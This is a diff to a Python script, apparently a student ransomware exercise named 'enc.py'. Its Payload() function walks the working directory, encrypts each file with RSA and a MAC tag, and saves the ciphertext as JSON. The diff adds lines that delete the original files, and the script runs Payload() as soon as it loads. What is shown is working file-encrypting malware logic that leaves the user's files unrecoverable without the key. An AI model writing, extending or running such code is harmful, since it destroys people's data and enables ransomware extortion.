@@ -10,6 +10,13 @@ import cryptography.hazmat.primitives.asymmetric as asymm
 from base64 import b64decode, b64encode
 from pathlib import Path
 
+#serialize python objects to be compatible with JSON
+def to_json(python_object):                                             
+	if isinstance(python_object, bytes):                                
+		return list(python_object)                      
+	raise TypeError(repr(python_object) + ' is not JSON serializable')  
+
+
 
 #generate public and private keys
 def keys():
@@ -353,23 +360,21 @@ def KeyHolder():
 
 def Payload():
 	public_key,private_key = KeyHolder()
-	#f = open('Encrypted_JSON.json','w')
-	#with os.scandir('testStep3') as it:
 	### This walks through the directory
 	for root, dirs, files in os.walk("."):
 		#Entry is the name of each file
 		for entry in files:
-			if not entry.startswith('.') and (entry[-5:] != '.json' and entry != 'private_key.pem' and entry != 'Encrypted_JSON.json' and entry != 'enc.py' and entry!= 'public_key.pem'):
+			if not entry.startswith('.') and (entry[-5:] != '.json' and entry != 'private_key.pem' and entry != 'enc.py' and entry!= 'public_key.pem'):
 				RSAcipher,ct,IV,tag,ext = MyRSAEncryptMAC(entry,public_key)
-				print(entry + ' ' + ext)
-				#print(json.dumps({'File Name':entry, 'RSACipher': RSAcipher, 'Cipher Text': ct, 'IV':IV, 'HMAC Tag': tag, 'File Extension':ext}, indent=4))
-				f = open((entry + '.json'), 'wb')
-				data = {'File Name':entry, 'RSACipher': RSAcipher, 'Cipher Text': ct, 'IV': IV, 'HMAC Tag': tag}
-				f.write(json.dumps(data))
+				filename = Path(entry).stem
+				filename = filename + '_Encr' + ext
+				print(entry + " " + filename)
+				f = open((entry + '.json'), 'w')
+				data = {'File Name':entry, 'RSACipher': RSAcipher, 'Cipher Text': ct, 'IV': IV, 'HMAC Tag': tag, 'File Extension': ext}
+				f.write(json.dumps(data, indent=4, default = to_json))
 				f.close()
-	#f.close()
-
-
+				os.remove(filename)
+				os.remove(entry)
 
 Payload()
 #print("test")
